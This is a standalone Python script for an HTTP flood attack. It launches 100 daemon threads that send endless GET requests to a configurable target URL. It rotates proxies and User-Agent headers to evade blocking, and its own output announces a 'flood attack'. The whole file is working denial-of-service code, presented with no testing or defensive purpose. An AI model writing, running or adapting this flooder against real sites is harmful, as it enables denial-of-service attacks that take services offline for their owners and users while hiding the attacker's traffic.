import requests
import threading
import time
import random

# Target URL - Enter the target URL here
target_url = 'http://example.com'

# Number of threads
threads = 100

# Requests per thread
requests_per_thread = 1000

# Proxy list - Add your proxy IPs here (this will be randomly chosen)
proxy_list = [
    'http://proxy1.com',
    'http://proxy2.com',
    'http://proxy3.com',
    'http://proxy4.com'
]

# User-Agent Rotation
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36'
]

# Headers Rotation
headers_list = [
    {'User-Agent': random.choice(user_agents), 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'},
    {'User-Agent': random.choice(user_agents), 'Accept-Language': 'en-US,en;q=0.5'},
    {'User-Agent': random.choice(user_agents), 'Accept-Encoding': 'gzip, deflate, br'}
]

# HTTP Flooding function
def flood():
    while True:
        try:
            # Proxy rotation
            proxy = {'http': random.choice(proxy_list), 'https': random.choice(proxy_list)}

            # Request headers rotation
            headers = random.choice(headers_list)
            
            response = requests.get(target_url, headers=headers, proxies=proxy, timeout=5)
            
            # Display successful request status
            if response.status_code == 200:
                print(f"Sent request to {target_url}, Status Code: {response.status_code}")
            else:
                print(f"Request failed with status: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")

# Create and start threads
def start_flooding():
    print(f"Starting flood attack on {target_url} with {threads} threads...")
    for i in range(threads):
        t = threading.Thread(target=flood)
        t.daemon = True  # Set threads as daemon threads
        t.start()

if __name__ == "__main__":
    start_flooding()
    while True:
        time.sleep(1)